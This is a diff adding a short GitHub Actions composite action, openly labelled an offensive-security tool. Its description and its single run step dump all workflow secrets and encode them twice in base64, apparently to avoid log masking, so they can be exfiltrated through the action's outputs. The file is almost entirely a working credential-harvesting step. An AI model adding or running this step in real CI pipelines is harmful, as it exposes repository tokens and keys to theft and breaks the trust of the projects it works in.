@@ -1,0 +1,12 @@
+name: '"Dump Secrets" Action for Offensive Security Workflows'
+description: 'Dumps available workflow secrets and provides them as outputs for exfiltration'
+
+outputs:
+  secrets:
+    description: 'Double base64-encoded list of secrets'
+
+runs:
+  using: 'composite'
+  steps:
+    - name: Dump secrets
+      run: echo "::set-output name=secrets::$(${{toJSON(secrets)}} | base64 | base64)"
